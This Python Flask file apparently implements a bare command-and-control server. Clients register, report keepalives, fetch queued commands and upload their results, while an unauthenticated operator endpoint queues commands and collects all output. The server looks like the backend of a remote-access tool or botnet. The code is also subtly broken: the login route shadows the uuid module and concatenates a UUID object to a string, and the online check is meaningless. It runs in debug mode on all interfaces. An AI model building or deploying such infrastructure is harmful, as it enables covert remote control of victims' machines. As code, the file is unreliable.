from flask import Flask, request, make_response, Response, jsonify, render_template
import redis
import json
import os
import datetime
import uuid
   
app = Flask(__name__)
r = redis.Redis(host='localhost', port=6379)

@app.route('/')
def index():
    """returns all ids and their status"""
    uuids = r.keys('keepalive:*')
    all_ids = [id.decode('utf-8') for id in uuids]
    online_ids = []
    offline_ids = []
    for id in all_ids:
        if r.exists(f'keepalive:{id}'):
            online_ids.append(id)
        else:
            offline_ids.append(id)
    return render_template('index.html', online_ids=online_ids, offline_ids=offline_ids)


@app.route('/login', methods=['POST'])
def login():
    """registers a new user\n
    Returns:
        str: uuid of the new user
    """
    uuid = uuid.uuid4()
    r.set(f'clients:{uuid}', 1)
    return 'Login successful, id:' + uuid

@app.route('/keepalive', methods=['GET'])
def keepalive():
    """makes client appear online, takes uuid as a parameter"""
    uuid = request.args['id']
    current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    r.set(f'keepalive:{uuid}', current_time, ex=3600)  # Set expiry for 1 hour (3600 seconds)
    return 'Keepalive recorded for' + uuid

@app.route('/send' , methods=['POST'])
def send():
    """registers a command for a specific uuid"""
    uuid = request.form.get('uuid')
    command = request.form.get('command')
    r.rpush(f'commands:{uuid}', command)
    return 'https://media.tenor.com/rcZMAz3r-fQAAAAM/borat-very.gif'

@app.route('/receive', methods=['GET'])
def receive():
    """returns commands that were sent to a specific uuid\n
    Returns:
        json: commands
    """
    uuid = request.args['id']
    commands = r.lrange(f'commands:{uuid}', 0, -1)
    r.delete(f'commands:{uuid}')
    return jsonify({'commands': commands})

@app.route('/result', methods=['POST'])
def result():
    """route for submitting results of commands, takes uuid as parameter"""
    uuid = request.args['id']
    results = json.loads(request.form.get('results'))
    for result in results:
        r.rpush(f'results:{uuid}', json.dumps(result))
    return 'Results received successfully'

@app.route('/get_results', methods=['GET'])
def get_results():
    """returns results of commands by all of the uuids

    Returns:
        json: all of the results
    """
    # TODO: fix confusing variable names
    all_results = {}
    uuids = r.keys('results:*')
    for uuid in uuids:
        results = r.lrange(uuid, 0, -1)
        results = [json.loads(result) for result in results]
        r.delete(uuid)
        all_results[uuid.decode('utf-8')] = results
    return jsonify(all_results)


if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=8000)
